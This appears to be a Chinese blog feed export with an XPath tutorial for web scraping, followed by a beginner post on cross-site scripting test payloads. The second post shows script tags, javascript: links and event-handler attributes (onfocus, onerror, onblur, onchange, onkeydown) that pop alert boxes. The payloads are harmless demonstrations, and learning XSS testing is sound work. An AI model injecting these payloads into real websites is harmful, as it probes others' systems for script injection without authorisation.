<h1 id="XPath表达式"><a href="#XPath表达式" class="headerlink" title="XPath表达式"></a>XPath表达式</h1><p>更详细的<a href="https://www.w3school.com.cn/xpath/xpath_operators.asp">https://www.w3school.com.cn/xpath/xpath_operators.asp</a></p>
<table>
<thead>
<tr>
<th align="left">表达式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[n]</td>
<td align="left">指定查询我想要的，他这个和列表是一样的比如xxxx[1]，这个是从1开始的不是0</td>
</tr>
<tr>
<td align="left">[last()]</td>
<td align="left">指定最后一个，一个你查询的结果太多我就想要最后一个就可以用<code>last()</code></td>
</tr>
<tr>
<td align="left">[position()&lt;n]</td>
<td align="left">指定前面<code>n</code>个结果，比如<code>[position()&lt;4]</code>就是指定输出前面<code>3</code>个</td>
</tr>
<tr>
<td align="left">and</td>
<td align="left">与，比如有一个点不成立就没有显示</td>
</tr>
<tr>
<td align="left">or</td>
<td align="left">或，只有有一个成立的就显示那个成立的</td>
</tr>
<tr>
<td align="left">|</td>
<td align="left">这个|就是和或者是或，比如`//a</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">* 代表匹配所有节点</td>
</tr>
</tbody></table>
<h2 id="指定查询我想要的"><a href="#指定查询我想要的" class="headerlink" title="[]指定查询我想要的"></a>[]指定查询我想要的</h2><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>可以看见的时间有好几个但是我只想要一个怎么办，我们就可以用<code>[]</code>来指定了,这个是从1开始的不是0</p>
</div> 

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div&#x2F;span[@property&#x3D;&quot;v:initialReleaseDate&quot;]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820154434322.png" alt="image-20210820154434322"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>比如我只想要第一个，我们就可以下面这样写</p>
</div> 

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div&#x2F;span[@property&#x3D;&quot;v:initialReleaseDate&quot;][1]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820154632239.png" alt="image-20210820154632239"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>比如我只想要第三个，我们就可以下面这样写</p>
</div> 

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div&#x2F;span[@property&#x3D;&quot;v:initialReleaseDate&quot;][3]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820154746770.png" alt="image-20210820154746770"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>我们也可以指定父目录比如<code>//div[3]/span[@property=&quot;v:initialReleaseDate&quot;]</code>我就不演示了</p>
</div> 

<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>他还可以用多个<code>[]</code></p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210821183122580.png" alt="image-20210821183122580"></p>
<h2 id="last-指定最后一个"><a href="#last-指定最后一个" class="headerlink" title="[last()]指定最后一个"></a>[last()]指定最后一个</h2><div class="note info simple"><p><code>[last()]</code>  指定最后一个，一个你查询的结果太多我就想要最后一个就可以用<code>last()</code></p>
</div>

<p>下面我只想要最后一个就可以用<code>last()</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820155509253.png" alt="image-20210820155509253"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div[@class&#x3D;&quot;tags-body&quot;]&#x2F;a[last()]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820155559049.png" alt="image-20210820155559049"></p>
<h2 id="position-lt-n-指定前面n个结果"><a href="#position-lt-n-指定前面n个结果" class="headerlink" title="[position()&lt;n]  指定前面n个结果"></a>[position()&lt;n]  指定前面<code>n</code>个结果</h2><div class="note info simple"><p>[position()&lt;n]  指定前面<code>n</code>个结果，比如<code>[position()&lt;4]</code>就是指定输出前面<code>3</code>个</p>
</div>



<p>比如下面我只想要前面三个结果就可以用[position()&lt;n]  指定前面<code>n</code>个结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div[@class&#x3D;&quot;tags-body&quot;]&#x2F;a</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820160037782.png" alt="image-20210820160037782"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div[@class&#x3D;&quot;tags-body&quot;]&#x2F;a[position()&lt;4]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820160130203.png" alt="image-20210820160130203"></p>
<h2 id="and与"><a href="#and与" class="headerlink" title="and与"></a>and与</h2><div class="note info simple"><p>and  与，比如有一个点不成立就没有显示</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210825120451131.png" alt="image-20210825120451131"></p>
<p>如果我错一个他就不显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210825120521450.png" alt="image-20210825120521450"></p>
<h2 id="or或"><a href="#or或" class="headerlink" title="or或"></a>or或</h2><div class="note info simple"><p>or  或，只有有一个成立的就显示那个成立的</p>
</div>

<p>俩个都正确都显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210825120642286.png" alt="image-20210825120642286"></p>
<p>如果错一个他也会显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210825120728818.png" alt="image-20210825120728818"></p>
<h2 id="和或者是与"><a href="#和或者是与" class="headerlink" title="|和或者是与"></a>|和或者是与</h2><div class="note info simple"><p>这个|就是和或者是或，比如<code>//a | //b</code>意思是如果他俩都有都匹配，如果只有一个他也会匹配那个有点</p>
</div>

<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div&#x2F;span[@property&#x3D;&quot;v:initialReleaseDate&quot;] </span><br></pre></td></tr></table></figure>
<p>我没有添加<code>|</code>他会匹配3个</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210821181852860.png" alt="image-20210821181852860"></p>
<div class="note info simple"><p>如果我还想在匹配一个那我们就可以添加<code>|</code>来实现了</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div&#x2F;span[@property&#x3D;&quot;v:initialReleaseDate&quot;] | &#x2F;&#x2F;div[@class&#x3D;&quot;tags-body&quot;]&#x2F;a</span><br></pre></td></tr></table></figure>
<p>可以看见结果是11个</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210821182029158.png" alt="image-20210821182029158"></p>
<div class="note info simple"><p>如果他其中一个是有问题的他也会匹配那个没有问题的这个就是或</p>
</div>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div&#x2F;spa| &#x2F;&#x2F;div[@class&#x3D;&quot;tags-body&quot;]&#x2F;a</span><br></pre></td></tr></table></figure>
<p>下面这个前面我故意写错可以看见他会匹配后面的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210821182241449.png" alt="image-20210821182241449"></p>
]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>Python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞用到的标签</title>
    <url>/2020/11/29/XSS%E6%BC%8F%E6%B4%9E%E7%94%A8%E5%88%B0%E7%9A%84%E6%A0%87%E7%AD%BE/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="测试常用的的标签"><a href="#测试常用的的标签" class="headerlink" title="测试常用的的标签"></a>测试常用的的标签</h2><p><strong>下面这个弹出是警告框</strong><br>代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;a&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201126164903.png"></p>
<p><strong>下面这个是弹出确认框</strong><br>代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;confirm(<span class="string">&#x27;xss&#x27;</span>);&lt;/script&gt;  </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201126164720.png"></p>
<p><strong>下面这个弹出来的是输入框</strong><br>代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;prompt(<span class="string">&#x27;a&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201126165059.png"></p>
<h2 id="为协议弹窗"><a href="#为协议弹窗" class="headerlink" title="为协议弹窗"></a>为协议弹窗</h2><p><code>javascript:alert(1);</code>是为协议，我们用这个在浏览器里面输入他就会弹出<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127090852.png"><br>然后回车，他就会弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127090933.png"></p>
<h3 id="超链接-lt-a-gt-标签弹窗"><a href="#超链接-lt-a-gt-标签弹窗" class="headerlink" title="超链接&lt;a&gt;标签弹窗"></a>超链接<code>&lt;a&gt;</code>标签弹窗</h3><p>下面这个<code>&lt;a&gt;</code>是定义超链接的<br>只要有人点击就会弹窗</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127091123.png"></p>
<h3 id="载入图形-lt-img-gt-标签弹窗"><a href="#载入图形-lt-img-gt-标签弹窗" class="headerlink" title="载入图形&lt;img&gt;标签弹窗"></a>载入图形<code>&lt;img&gt;</code>标签弹窗</h3><p>下面这个只能在<code>IE浏览器6</code>才能弹窗</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="事件进行弹窗"><a href="#事件进行弹窗" class="headerlink" title="事件进行弹窗"></a>事件进行弹窗</h2><table>
<thead>
<tr>
<th align="center">事件属性名</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>onfocus</code></td>
<td align="right">获取到焦点时触发</td>
</tr>
<tr>
<td align="center"><code>onerror</code></td>
<td align="right">事件会在文档或图像加载过程中发生错误时被触发</td>
</tr>
<tr>
<td align="center"><code>onblur</code></td>
<td align="right">当用户离开执行一段Javascript代码</td>
</tr>
<tr>
<td align="center"><code>onchange</code></td>
<td align="right">事件会在域的内容改变时发生</td>
</tr>
<tr>
<td align="center"><code>onkeydown</code></td>
<td align="right">事件会在用户按下一个键盘按键时发生</td>
</tr>
<tr>
<td align="center"><code>onkeyup</code></td>
<td align="right">事件会在键盘按键被松开时发生</td>
</tr>
<tr>
<td align="center"><code>onclick</code></td>
<td align="right">事件会在对象被点击时发生</td>
</tr>
<tr>
<td align="center"><code>onselect</code></td>
<td align="right">事件会在文本框中的文本被选中时发生</td>
</tr>
<tr>
<td align="center"><code>oninput</code></td>
<td align="right">事件在用户输入时触发</td>
</tr>
<tr>
<td align="center"><code>onmousemove</code></td>
<td align="right">事件会在鼠标指针移到指定的对象时发生</td>
</tr>
</tbody></table>
<p>onerror</p>
<h3 id="onfocus事件属性"><a href="#onfocus事件属性" class="headerlink" title="onfocus事件属性"></a>onfocus事件属性</h3><p><code>onfocus</code> 获取到焦点时触发<br><code>onfocus</code>规定该事件发生时执行的 JavaScript  </p>
<p>支持的HTML有</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>, <span class="tag">&lt;<span class="name">acronym</span>&gt;</span>, <span class="tag">&lt;<span class="name">address</span>&gt;</span>, <span class="tag">&lt;<span class="name">area</span>&gt;</span>, <span class="tag">&lt;<span class="name">b</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">big</span>&gt;</span>, <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>, <span class="tag">&lt;<span class="name">button</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">caption</span>&gt;</span>, <span class="tag">&lt;<span class="name">cite</span>&gt;</span>, <span class="tag">&lt;<span class="name">dd</span>&gt;</span>, <span class="tag">&lt;<span class="name">del</span>&gt;</span>, <span class="tag">&lt;<span class="name">dfn</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, <span class="tag">&lt;<span class="name">dl</span>&gt;</span>, <span class="tag">&lt;<span class="name">dt</span>&gt;</span>, <span class="tag">&lt;<span class="name">em</span>&gt;</span>, <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span>, <span class="tag">&lt;<span class="name">frame</span>&gt;</span>, <span class="tag">&lt;<span class="name">frameset</span>&gt;</span>, <span class="tag">&lt;<span class="name">h1</span>&gt;</span> to <span class="tag">&lt;<span class="name">h6</span>&gt;</span>, <span class="tag">&lt;<span class="name">hr</span>&gt;</span>, <span class="tag">&lt;<span class="name">i</span>&gt;</span>, <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">img</span>&gt;</span>, <span class="tag">&lt;<span class="name">input</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>, <span class="tag">&lt;<span class="name">kbd</span>&gt;</span>, <span class="tag">&lt;<span class="name">label</span>&gt;</span>, <span class="tag">&lt;<span class="name">legend</span>&gt;</span>, <span class="tag">&lt;<span class="name">li</span>&gt;</span>, <span class="tag">&lt;<span class="name">object</span>&gt;</span>, <span class="tag">&lt;<span class="name">ol</span>&gt;</span>, <span class="tag">&lt;<span class="name">p</span>&gt;</span>, <span class="tag">&lt;<span class="name">pre</span>&gt;</span>, <span class="tag">&lt;<span class="name">q</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">samp</span>&gt;</span>, <span class="tag">&lt;<span class="name">select</span>&gt;</span>, <span class="tag">&lt;<span class="name">small</span>&gt;</span>, <span class="tag">&lt;<span class="name">span</span>&gt;</span>, <span class="tag">&lt;<span class="name">strong</span>&gt;</span>, <span class="tag">&lt;<span class="name">sub</span>&gt;</span>, <span class="tag">&lt;<span class="name">sup</span>&gt;</span>, <span class="tag">&lt;<span class="name">table</span>&gt;</span>, <span class="tag">&lt;<span class="name">tbody</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>, <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>, <span class="tag">&lt;<span class="name">th</span>&gt;</span>, <span class="tag">&lt;<span class="name">thead</span>&gt;</span>, <span class="tag">&lt;<span class="name">tr</span>&gt;</span>, <span class="tag">&lt;<span class="name">tt</span>&gt;</span>, <span class="tag">&lt;<span class="name">ul</span>&gt;</span>, <span class="tag">&lt;<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试"><a href="#下面是我的测试" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;input&gt;</code>标签表单元素弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击输入框就会弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127094850.png"></p>
<p><strong><code>&lt;a&gt;</code>标签定义超链接弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击就会弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127093732.png"></p>
<p><strong><code>&lt;select&gt;</code>标签定义选项列表弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>  <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;a&quot;</span>&gt;</span>a<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;b&quot;</span>&gt;</span>b<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击就会弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127094049.png"></p>
<h3 id="onerror事件属性"><a href="#onerror事件属性" class="headerlink" title="onerror事件属性"></a>onerror事件属性</h3><p><code>onerror</code> 事件会在文档或图像加载过程中发生错误时被触发<br>支持该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>, <span class="tag">&lt;<span class="name">object</span>&gt;</span>, <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-1"><a href="#下面是我的测试-1" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;img&gt;</code>图片标签</strong><br>我只要一打开就会弹窗因为加载一个没有的照片<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127153313.png"></p>
<h3 id="onblur事件属性"><a href="#onblur事件属性" class="headerlink" title="onblur事件属性"></a>onblur事件属性</h3><p><code>onblur</code>当用户离开执行一段Javascript代码</p>
<p>支持该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>, <span class="tag">&lt;<span class="name">acronym</span>&gt;</span>, <span class="tag">&lt;<span class="name">address</span>&gt;</span>, <span class="tag">&lt;<span class="name">area</span>&gt;</span>, <span class="tag">&lt;<span class="name">b</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">big</span>&gt;</span>, <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>, <span class="tag">&lt;<span class="name">caption</span>&gt;</span>, <span class="tag">&lt;<span class="name">cite</span>&gt;</span>, <span class="tag">&lt;<span class="name">dd</span>&gt;</span>, <span class="tag">&lt;<span class="name">del</span>&gt;</span>, <span class="tag">&lt;<span class="name">dfn</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, <span class="tag">&lt;<span class="name">dl</span>&gt;</span>, <span class="tag">&lt;<span class="name">dt</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>, <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>, <span class="tag">&lt;<span class="name">form</span>&gt;</span>, <span class="tag">&lt;<span class="name">frame</span>&gt;</span>, <span class="tag">&lt;<span class="name">frameset</span>&gt;</span>, <span class="tag">&lt;<span class="name">h1</span>&gt;</span> to <span class="tag">&lt;<span class="name">h6</span>&gt;</span>, <span class="tag">&lt;<span class="name">hr</span>&gt;</span>, <span class="tag">&lt;<span class="name">i</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">img</span>&gt;</span>, <span class="tag">&lt;<span class="name">input</span>&gt;</span>, <span class="tag">&lt;<span class="name">ins</span>&gt;</span>, <span class="tag">&lt;<span class="name">kbd</span>&gt;</span>, <span class="tag">&lt;<span class="name">label</span>&gt;</span>, <span class="tag">&lt;<span class="name">legend</span>&gt;</span>, <span class="tag">&lt;<span class="name">li</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">object</span>&gt;</span>, <span class="tag">&lt;<span class="name">ol</span>&gt;</span>, <span class="tag">&lt;<span class="name">p</span>&gt;</span>, <span class="tag">&lt;<span class="name">pre</span>&gt;</span>, <span class="tag">&lt;<span class="name">q</span>&gt;</span>, <span class="tag">&lt;<span class="name">samp</span>&gt;</span>, <span class="tag">&lt;<span class="name">select</span>&gt;</span>, <span class="tag">&lt;<span class="name">small</span>&gt;</span>, <span class="tag">&lt;<span class="name">span</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>, <span class="tag">&lt;<span class="name">sub</span>&gt;</span>, <span class="tag">&lt;<span class="name">sup</span>&gt;</span>, <span class="tag">&lt;<span class="name">table</span>&gt;</span>, <span class="tag">&lt;<span class="name">tbody</span>&gt;</span>, <span class="tag">&lt;<span class="name">td</span>&gt;</span>, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>, <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>, <span class="tag">&lt;<span class="name">thead</span>&gt;</span>, <span class="tag">&lt;<span class="name">tr</span>&gt;</span>, <span class="tag">&lt;<span class="name">tt</span>&gt;</span>, <span class="tag">&lt;<span class="name">ul</span>&gt;</span>, <span class="tag">&lt;<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-2"><a href="#下面是我的测试-2" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;input&gt;</code>标签表单元素弹窗</strong></p>
<p>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onblur</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当离开输入框的时候就会弹窗</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127095338.png"></p>
<h3 id="onchange事件属性"><a href="#onchange事件属性" class="headerlink" title="onchange事件属性"></a>onchange事件属性</h3><p><code>onchange</code>事件会在域的内容改变时发生<br>支持该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span>, <span class="tag">&lt;<span class="name">select</span>&gt;</span>, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-3"><a href="#下面是我的测试-3" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;input&gt;</code>标签表单元素弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">onchange</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们输入一个字符回车就会弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127100502.png"></p>
<h3 id="onkeydown事件属性"><a href="#onkeydown事件属性" class="headerlink" title="onkeydown事件属性"></a>onkeydown事件属性</h3><p><code>onkeydown</code>事件会在用户按下一个键盘按键时发生<br>支持该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>, <span class="tag">&lt;<span class="name">acronym</span>&gt;</span>, <span class="tag">&lt;<span class="name">address</span>&gt;</span>, <span class="tag">&lt;<span class="name">area</span>&gt;</span>, <span class="tag">&lt;<span class="name">b</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">big</span>&gt;</span>, <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>, <span class="tag">&lt;<span class="name">body</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>, <span class="tag">&lt;<span class="name">caption</span>&gt;</span>, <span class="tag">&lt;<span class="name">cite</span>&gt;</span>, <span class="tag">&lt;<span class="name">code</span>&gt;</span>, <span class="tag">&lt;<span class="name">dd</span>&gt;</span>, <span class="tag">&lt;<span class="name">del</span>&gt;</span>, <span class="tag">&lt;<span class="name">dfn</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, <span class="tag">&lt;<span class="name">dt</span>&gt;</span>, <span class="tag">&lt;<span class="name">em</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>, <span class="tag">&lt;<span class="name">form</span>&gt;</span>, <span class="tag">&lt;<span class="name">h1</span>&gt;</span> to <span class="tag">&lt;<span class="name">h6</span>&gt;</span>, <span class="tag">&lt;<span class="name">hr</span>&gt;</span>, <span class="tag">&lt;<span class="name">i</span>&gt;</span>, <span class="tag">&lt;<span class="name">input</span>&gt;</span>, <span class="tag">&lt;<span class="name">kbd</span>&gt;</span>, <span class="tag">&lt;<span class="name">label</span>&gt;</span>, <span class="tag">&lt;<span class="name">legend</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>, <span class="tag">&lt;<span class="name">map</span>&gt;</span>, <span class="tag">&lt;<span class="name">object</span>&gt;</span>, <span class="tag">&lt;<span class="name">ol</span>&gt;</span>, <span class="tag">&lt;<span class="name">p</span>&gt;</span>, <span class="tag">&lt;<span class="name">pre</span>&gt;</span>, <span class="tag">&lt;<span class="name">q</span>&gt;</span>, <span class="tag">&lt;<span class="name">samp</span>&gt;</span>, <span class="tag">&lt;<span class="name">select</span>&gt;</span>, <span class="tag">&lt;<span class="name">small</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>, <span class="tag">&lt;<span class="name">strong</span>&gt;</span>, <span class="tag">&lt;<span class="name">sub</span>&gt;</span>, <span class="tag">&lt;<span class="name">sup</span>&gt;</span>, <span class="tag">&lt;<span class="name">table</span>&gt;</span>, <span class="tag">&lt;<span class="name">tbody</span>&gt;</span>, <span class="tag">&lt;<span class="name">td</span>&gt;</span>, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>, <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>, <span class="tag">&lt;<span class="name">thead</span>&gt;</span>, <span class="tag">&lt;<span class="name">tr</span>&gt;</span>, <span class="tag">&lt;<span class="name">tt</span>&gt;</span>, <span class="tag">&lt;<span class="name">ul</span>&gt;</span>, <span class="tag">&lt;<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-4"><a href="#下面是我的测试-4" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;input&gt;</code>标签表单元素弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">onkeydown</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
